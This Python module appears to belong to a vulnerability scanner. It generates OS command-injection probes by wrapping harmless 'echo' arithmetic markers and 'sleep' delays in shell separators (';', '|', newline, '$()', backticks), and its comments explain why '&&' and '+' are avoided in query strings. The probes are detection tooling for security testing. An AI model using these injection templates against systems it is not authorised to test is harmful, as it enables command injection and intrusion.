import secrets
from typing import List, Tuple

# One shell separator/substitution form per entry. "&&" is intentionally excluded: an "&" in a query
# string is a parameter delimiter, so it would truncate the payload before the shell ever sees it.
INJECTION_TEMPLATES: List[str] = [
    "; {cmd}",
    "| {cmd}",
    "\n{cmd}",
    "$({cmd})",
    "`{cmd}`",
]


def build_output_payloads() -> List[Tuple[str, str]]:
    """Return ``(injection, expected_marker)`` pairs for output-based detection.

    Each marker is random hex tokens bracketing the *result* of ``$((a*b))`` while the injection
    carries only the un-evaluated expression, so the marker appears only if the shell evaluated the
    arithmetic — proving execution, not reflection. Multiplication rather than addition: a ``+`` in
    the query string is decoded to a space and would corrupt the expression.
    """
    payloads: List[Tuple[str, str]] = []
    for template in INJECTION_TEMPLATES:
        left = secrets.token_hex(4)
        right = secrets.token_hex(4)
        a = secrets.randbelow(9000) + 1000
        b = secrets.randbelow(9000) + 1000
        expected_marker = f"{left}{a * b}{right}"
        command = f"echo {left}$(({a}*{b})){right}"
        payloads.append((template.format(cmd=command), expected_marker))
    return payloads


def build_time_payloads(seconds: int) -> List[str]:
    """Return the ``sleep`` injection payloads, one per injection form. Call with ``seconds=0`` to
    get the neutralized baseline set used to confirm a delay is caused by the injection."""
    command = f"sleep {seconds}"
    return [template.format(cmd=command) for template in INJECTION_TEMPLATES]
